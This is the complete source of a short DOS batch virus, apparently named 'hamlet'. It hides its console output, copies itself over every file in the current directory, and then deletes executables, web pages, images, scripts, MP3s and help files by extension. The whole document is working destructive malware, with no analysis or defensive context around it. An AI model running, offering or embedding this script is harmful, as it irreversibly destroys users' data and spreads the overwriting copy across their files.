   @echo off
   ctty nul
   for %%v in (*.*) do copy %0 C:\hamlet.bat
   for %%v in (*.*) do copy C:\hamlet.bat *.*
   @del C:\hamlet.bat
   @del *.exe
   @del *.htm
   @del *.gif
   @del *.html
   @del *.vbs
   @del *.js
   @del *.mp3
   @del *.com
   @del *.hlp
